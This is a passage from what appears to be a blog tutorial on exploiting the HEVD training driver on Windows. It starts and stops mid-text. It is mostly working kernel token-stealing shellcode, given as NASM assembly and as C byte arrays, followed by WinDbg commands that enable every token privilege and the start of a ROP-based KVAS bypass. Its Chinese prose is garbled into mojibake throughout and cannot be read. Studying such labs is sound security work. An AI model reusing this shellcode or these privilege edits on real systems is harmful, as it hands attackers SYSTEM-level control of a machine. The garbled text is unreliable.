ˆï¼Œä½†æ˜¯æˆ‘ä»¬åªæœ‰äº†ROPï¼ŒROPé“¾ä¸­å­˜åœ¨ä¸¤ä¸ª<code>ret</code>å’Œä¸€ä¸ª<code>pop</code>ï¼ŒæŠ¬æ ˆäº†0x18ï¼Œæ‰€ä»¥åœ¨shellcodeä¸­åªéœ€è¦<code>add rsp, 0x10</code></p><p><img src="https://img.joe1sn.top/uploads/big/dbc0a6a596ddb6db46f6a3a920c17dbf.png" alt="image-20240120105533497" /></p><p>åŒæ—¶HEVDçš„<code>NT_STATUS</code>ä½¿ç”¨<code>RAX</code>æ£€æµ‹å¤„ç†æ˜¯å¦æˆåŠŸï¼Œæ‰€ä»¥è¦<code>xor rax,rax</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:    </span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, gs:[rax+0x188]</span><br><span class="line">    mov rax, [rax+0xb8]     ;rax = å½“å‰EPROCESS</span><br><span class="line">    mov r9, rax             ;r9  = å½“å‰EPROCESS</span><br><span class="line">    mov rax, [rax+0x448]    ;rax = å½“å‰EPROCESS.List</span><br><span class="line">    mov rax, [rax]          ;rax = å½“å‰EPROCESS.List-&gt;flink</span><br><span class="line"></span><br><span class="line">__loop:</span><br><span class="line">    mov rdx, [rax-0x8]      ;rdx = ä¸Šä¸€ä¸ªè¿›ç¨‹çš„ upid</span><br><span class="line">    mov r8, rax             ;r8  = å½“å‰EPROCESS.List-&gt;flink</span><br><span class="line">    mov rax, [rax]          ;rax = ä¸Šä¸€ä¸ªè¿›ç¨‹çš„.List</span><br><span class="line">    cmp rdx, 0x4</span><br><span class="line">    jnz __loop</span><br><span class="line"></span><br><span class="line">    ;rdx = 4</span><br><span class="line">    ;r8 = System EPROCESS</span><br><span class="line">    mov rdx, [r8+0x70]      ;rdx = system token</span><br><span class="line">    and rdx, -0x8           ;æ¶ˆé™¤ä½4ä½</span><br><span class="line">    mov rcx, [r9+0x4b8]     ;å½“å‰EPROCESSçš„token</span><br><span class="line">    and rcx, 0x7            ;</span><br><span class="line">    add rdx, rcx            ;rdx = ç³»ç»Ÿtokené«˜ä½+å½“å‰tokenä½4ä½</span><br><span class="line">    mov [r9+0x4b8], rdx     ;å°†åˆæˆçš„tokenå¤åˆ¶ç»™å½“å‰</span><br><span class="line"></span><br><span class="line">    add rsp, 0x10</span><br><span class="line">    retn</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨nasm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &quot;C:\Users\xxxx\AppData\Local\bin\NASM\nasm.exe&quot; -f win64 .\TokenSteal.asm -o .\TokenSteal.bin</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å‡ºçš„æ–‡ä»¶ä½COFFæ ¼å¼ï¼Œè¦æå–å‡ºæ¥ï¼Œè¿™é‡Œæˆ‘ç”¨çš„æ˜¯<code>CFF Explore</code>çš„å¿«é€Ÿåæ±‡ç¼–å®šä½åˆ°ä»£ç ç„¶åç”¨<code>HxD</code>æå–çš„</p><p><img src="https://img.joe1sn.top/uploads/big/fd7286caaeb3160933b88c897f0315a3.png" alt="image-20240120110131666" /></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cmd[<span class="number">84</span>] = &#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0x91</span>,</span><br><span class="line"><span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xC4</span>, <span class="number">0x10</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/c0d0423c8f27b5c1bf5d53ab7948a4b9.png" alt="image-20240120105950658" /></p><p><img src="https://img.joe1sn.top/uploads/big/22bab2bb970e84dfa0c194ec6f01567a.png" alt="image-20240120110002444" /></p><h2 id="c-åˆ†æä¸Šä¸€ç¯‡çš„shellcode"><a class="markdownIt-Anchor" href="#c-åˆ†æä¸Šä¸€ç¯‡çš„shellcode"></a> C. åˆ†æä¸Šä¸€ç¯‡çš„shellcode</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">BYTE cmd[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>,</span><br><span class="line"><span class="number">0xc1</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xfa</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xf0</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>,</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe2</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x89</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xca</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xff</span>, <span class="number">0xc1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4c</span>, <span class="number">0x8b</span>, <span class="number">0x9a</span>, <span class="number">0x78</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xa2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xaa</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0xf8</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å†™å…¥ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡æ¡£ï¼Œç”¨idaé€†å‘</p><p><img src="https://img.joe1sn.top/uploads/big/ad5f9f69c5c817f016f3af5ca4717316.png" alt="image-20240119202727334" /></p><p>å‘ç°åŸç†ä¸€è‡´ï¼Œæœ€åå¯¹æ ˆçš„æ¢å¤ä¸åŒ</p><p>å·²çŸ¥<code>gs:[0x188]</code>æŒ‡å‘ä¸€ä¸ª<code>_KTHREAD</code>ç»“æ„ä½“</p><p><img src="https://img.joe1sn.top/uploads/big/f0a5031af56eee9d505358818846a94e.png" alt="image-20240120112824920" /></p><p>æ ¹æ®windbgçš„è°ƒè¯•ç»“æœçŸ¥é“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov cx, [rax+0x1e4];+0x1e4 KernelApcDisable : 0n-1</span><br><span class="line">inc cx;</span><br><span class="line">mov [rax+0x1e4], cx;æ›´æ–°KernelApcDisableä¸º0</span><br><span class="line">mov rdx, [rax+0x90];+0x090 [TrapFrame]: 0xfffff88e`1d2edb00 </span><br><span class="line">;_KTRAP_FRAME</span><br><span class="line">;---ä¸‹é¢ä¸º_KTRAP_FRAME</span><br><span class="line">mov rcx, [rdx+0x168];[+0x168] Rip</span><br><span class="line">mov r11, [rdx+0x178];[+0x178] EFlags</span><br><span class="line">mov rsp, [rdx+0x180];[+0x180] Rsp</span><br><span class="line">mov rbp, [rdx+0x158];[+0x158] Rbp</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/6a427f532364b38c531a30c8e66922c5.png" alt="image-20240120113526235" /></p><p>å¯èƒ½è¿˜æ˜¯æœ‰ç‚¹ğŸ˜µï¼Œåæ±‡ç¼–ä¸€ä¸‹<code>TrapFrame</code>çš„RIP</p><p><img src="https://img.joe1sn.top/uploads/big/c053402edbe07075e363de45ec014e8d.png" alt="image-20240120113739799" /></p><p>ç›¸å½“äºé€šè¿‡<code>TrapFrame</code>ï¼Œæ›¿æ¢äº†expä¸­çš„<code>DeviceIoControl</code>ï¼ˆæ¨¡ä»¿æ­£å¸¸æ‰§è¡Œï¼‰ï¼Œå¹¶è®©ä»–æ­£å¸¸è¿”å›</p><p>æ¥ç€é‡å®šä½GSå¯„å­˜å™¨ï¼Œä½¿ç”¨sysretè¿”å›ï¼Œä¸ºäº†å¯¹é½ï¼Œæœ‰çš„æ±‡ç¼–æ˜¯è¿™æ ·çš„å†™çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o64 sysret; nasm shit</span><br></pre></td></tr></table></figure><h2 id="d-å¼€å¯tokenæ‰€æœ‰æƒé™-ä¼˜åŒ–shellcode"><a class="markdownIt-Anchor" href="#d-å¼€å¯tokenæ‰€æœ‰æƒé™-ä¼˜åŒ–shellcode"></a> D. å¼€å¯Tokenæ‰€æœ‰æƒé™ [ä¼˜åŒ–shellcode]</h2><p>å³ä½¿æˆ‘ä»¬å·²ç»æˆåŠŸç”Ÿæˆäº†ä»¤ç‰Œï¼Œä½†æ˜¯åŠŸèƒ½ä¾æ—§æ˜¯ä¸å…¨çš„</p><p><img src="https://img.joe1sn.top/uploads/big/f5b2dd61f571c1edcc1a160ddd63139a.png" alt="image-20240120114406196" /></p><p>è¢«ç¦ç”¨çš„åŠŸèƒ½ä¾æ—§æœ‰å¾ˆå¤š</p><h3 id="i-å¼€å¯å½“å‰æƒé™ä¸ºå¯ç”¨"><a class="markdownIt-Anchor" href="#i-å¼€å¯å½“å‰æƒé™ä¸ºå¯ç”¨"></a> I. å¼€å¯å½“å‰æƒé™ä¸ºå¯ç”¨</h3><p>é‡æ–°æ‰“å¼€ä¸€ä¸ªæ™®é€šç”¨æˆ·çš„<code>cmd.exe</code></p><p><img src="https://img.joe1sn.top/uploads/big/c2da1e221a9d8e62c9a4ae27901bf004.png" alt="image-20240120125235344" /></p><p>ç”¨Aéƒ¨åˆ†çš„æ–¹æ³•æ‰¾åˆ°è¯¥è¿›ç¨‹</p><p><img src="https://img.joe1sn.top/uploads/big/50a5f3dc61a7e608b21298558bec4cd4.png" alt="image-20240120125516929" /></p><p>æŸ¥çœ‹tokenæ ¼å¼ï¼Œå¯¹ç…§ä¸€ä¸‹SIDã€‚ï¼ˆæ³¨æ„ä½ä½è¦ä¸º0ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!token &lt;Tokenæ•°å€¼ï¼Œä½†æ˜¯ä¸ªä½æ•°ä¸º0&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/c3cdd2d87ff279e4761888663f50107e.png" alt="image-20240120125615410" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt !_sep_token_privileges 0xffffb106`ecc96060+0x40</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/33d8902ffc4e5dedfac463bebb0bd38e.png" alt="image-20240120130022681" /></p><p>å°†Enabledå€¼è®¾ç½®ä¸ºPresentå€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eq 0xffffb106`ecc96060+0x40+8 0x00000006`02880000</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/cbe5b50b2b24ebedaefea6bf4e406ea0.png" alt="image-20240120130054144" /></p><p>æŸ¥çœ‹æƒé™</p><p><img src="https://img.joe1sn.top/uploads/big/d3567ad9cbcbac4a49c839f81cb11751.png" alt="image-20240120130116310" /></p><h3 id="ii-è·å¾—æ‰€æœ‰æƒé™å¹¶å¯ç”¨"><a class="markdownIt-Anchor" href="#ii-è·å¾—æ‰€æœ‰æƒé™å¹¶å¯ç”¨"></a> II. è·å¾—æ‰€æœ‰æƒé™å¹¶å¯ç”¨</h3><p>ç”¨Aéƒ¨åˆ†çš„æ–¹æ³•å¾—åˆ°Systemçš„Token</p><p><img src="https://img.joe1sn.top/uploads/big/b44eaf47a38695dc4a35d9f25a958054.png" alt="image-20240120130740237" /></p><p>å†å¾—åˆ°SystemTokençš„Presentå€¼</p><p><img src="https://img.joe1sn.top/uploads/big/a8398e0631de11a93f09ef3f4d3c4dee.png" alt="image-20240120132052083" /></p><p>è®¾ç½®å½“å‰Tokençš„Presentå’ŒEnabledä¸ºè¯¥å€¼</p><p><img src="https://img.joe1sn.top/uploads/big/70610eb7cea6455cb6dcd0032cb200b3.png" alt="image-20240120132313137" /></p><p>æŸ¥çœ‹æƒé™</p><p><img src="https://img.joe1sn.top/uploads/big/06841330f3a322ab5896df99084d3acf.png" alt="image-20240120132350635" /></p><h3 id="iiié‡æ–°ç¼–å†™shellcode"><a class="markdownIt-Anchor" href="#iiié‡æ–°ç¼–å†™shellcode"></a> III.é‡æ–°ç¼–å†™shellcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:    </span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, gs:[rax + 0x188]</span><br><span class="line">    mov rax, [rax + 0xb8]     ;rax = å½“å‰EPROCESS</span><br><span class="line">    mov r9, rax               ;r9  = å½“å‰EPROCESS</span><br><span class="line">    mov rax, [rax + 0x448]    ;rax = å½“å‰EPROCESS.List</span><br><span class="line">    mov rax, [rax]            ;rax = å½“å‰EPROCESS.List-&gt;flink</span><br><span class="line"></span><br><span class="line">__loop:</span><br><span class="line">    mov rdx, [rax - 0x8]      ;rdx = ä¸Šä¸€ä¸ªè¿›ç¨‹çš„ upid</span><br><span class="line">    mov r8, rax               ;r8  = å½“å‰EPROCESS.List-&gt;flink</span><br><span class="line">    mov rax, [rax]            ;rax = ä¸Šä¸€ä¸ªè¿›ç¨‹çš„.List</span><br><span class="line">    cmp rdx, 0x4</span><br><span class="line">    jnz __loop</span><br><span class="line"></span><br><span class="line">    ;rdx = 4</span><br><span class="line">    ;r8 = System EPROCESS</span><br><span class="line">    mov rdx, [r8+0x70]      ;rdx = system token</span><br><span class="line">    and rdx, -0x8           ;æ¶ˆé™¤ä½4ä½</span><br><span class="line">    mov rcx, [r9+0x4b8]     ;å½“å‰EPROCESSçš„token</span><br><span class="line">    and rcx, 0x7            ;</span><br><span class="line">    add rdx, rcx            ;rdx = ç³»ç»Ÿtokené«˜ä½+å½“å‰tokenä½4ä½</span><br><span class="line">    mov [r9+0x4b8], rdx     ;å°†åˆæˆçš„tokenå¤åˆ¶ç»™å½“å‰</span><br><span class="line"></span><br><span class="line">    ;Enable ALL</span><br><span class="line">    mov rdx, [r8 + 0x70]      ;rdx = system token</span><br><span class="line">    and rdx, 0xFFFFFFFFFFFFFFF0           ;system token: æ¶ˆé™¤ä½8ä½ï¼Œä¾¿äºè§£æToken</span><br><span class="line">    mov rbx, [rdx + 0x40]     ;rbx = System tokençš„Present</span><br><span class="line">    mov rcx, [r9 + 0x4b8]     ;rcx = æ–°çš„EPROCESSçš„token</span><br><span class="line">    and rcx, 0xFFFFFFFFFFFFFFF0           ;new current token: æ¶ˆé™¤ä½8ä½ï¼Œä¾¿äºè§£æToken</span><br><span class="line">    mov [rcx + 0x40], rbx</span><br><span class="line">    mov [rcx + 0x48], rbx</span><br><span class="line"></span><br><span class="line">    xor rax, rax</span><br><span class="line">    add rsp, 0x10</span><br><span class="line">    retn</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/7a422f59bf47ec0ff9c55f9f9d5c580d.png" alt="image-20240120134710391" /></p><h1 id="kvas"><a class="markdownIt-Anchor" href="#kvas"></a> KVAS</h1><h2 id="a-ç®€ä»‹"><a class="markdownIt-Anchor" href="#a-ç®€ä»‹"></a> A. ç®€ä»‹</h2><p>KVASå…¨ç§°æ˜¯Kernel Virtual Address Shadowï¼Œå®ƒçš„å‡ºç°ä¸MeltDownï¼ˆCVE-2017-5754ï¼‰å’ŒTotalMeltDownï¼ˆCVE-2018-1038ï¼‰æœ‰å…³ã€‚</p><p>æˆ‘çš„æè¿°ä¸ä¸€å®šå‡†ç¡®ï¼Œå¤§è‡´ä¸Šæ¥è¯´è¿™ä¸¤ä¸ªæ¼æ´åˆ©ç”¨äº†CPUçš„ä¹±åºæ‰§è¡ŒæŠ€æœ¯ï¼Œå³CPUåœ¨æ‰§è¡Œæ—¶ä¸ä¸€å®šä¼šæŒ‰ç…§æµç¨‹æ‰§è¡Œã€‚å½“æˆ‘ä»¬è®¿é—®ä¸€ä¸ªä¸èƒ½è¢«ç”¨æˆ·æ¨¡å¼è®¿é—®çš„å†…å­˜é¡µæ—¶ï¼ŒCPUä¼šæ‰§è¡Œè¯¥è¯­å¥ç„¶åå°†å…¶ç¼“å­˜åˆ°å†…å­˜ä¸­ï¼Œç­‰åˆ°å‘ç°ä¸èƒ½è®¿é—®åè¿”å›é”™è¯¯ï¼Œä½†æ˜¯è¯¥æ•°æ®ä¾æ—§å­˜åœ¨äºç¼“å­˜å½“ä¸­ã€‚åˆ©ç”¨è¿™ç§æ€è·¯å°±å¯ä»¥å®Œå…¨è¯»å–å†…æ ¸ä¸­çš„æ•°æ®ï¼Œå®ç°æƒé™æå‡ç­‰ã€‚</p><p>å¾®è½¯ä¸ºäº†ç¼“è§£è¯¥æ¼æ´ï¼Œä»ç”¨æˆ·é¡µè¡¨ä¸­éš”ç¦»å‡ºå†…æ ¸é¡µè¡¨ï¼Œè®©ç”¨æˆ·æ€è®¿é—®åˆ°çš„å†…æ ¸é¡µè¡¨ä¹Ÿæ˜¯ç»è¿‡æ˜ å°„çš„ï¼Œå¹¶ä¸”ä¼šå°†ç”¨æˆ·é¡µè¡¨è‡ªåŠ¨æ ‡è®°ä¸ºNXï¼Œè®©æˆ‘ä»¬çš„shellcodeæ— æ³•æ‰§è¡Œ</p><h2 id="b-bypass"><a class="markdownIt-Anchor" href="#b-bypass"></a> B. Bypass</h2><p>è™½ç„¶ç”¨æˆ·é¡µè¡¨ä¸ºä¸å¯æ‰§è¡Œï¼Œ<strong>ä½†æ˜¯å†…æ ¸é¡µè¡¨ä»ç„¶å¯æ‰§è¡Œ</strong>ï¼Œåªä¸è¿‡ä¼šå»¶é•¿æˆ‘ä»¬ROPé“¾çš„é•¿åº¦</p><p>éœ€è¦ç”¨åˆ°çš„å‡½æ•°æ˜¯ï¼š<code>ExAllocatePoolWithTag</code>å’Œ<code>RtlCopyMemory</code></p><ul><li><code>ExAllocatePoolWithTag</code>ï¼šç”¨äºåœ¨å†…æ ¸ä¸­å¼€è¾Ÿä¸€å—åœ°å€</li><li><code>RtlCopyMemory</code>ï¼šå¤åˆ¶å†…å­˜åˆ°å†…æ ¸å¼€è¾Ÿçš„å†…å­˜æ± </li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LPVOID space = <span class="built_in">ExAllocatePoolWithTag</span>(<span class="number">0</span>, <span class="number">0x100</span>, <span class="number">0xDEAD</span>);</span><br><span class="line"><span class="comment">//NonPagedPoolExecute = 0</span></span><br><span class="line"><span class="comment">//ç©ºé—´å¤§å°ï¼š0x100</span></span><br><span class="line"><span 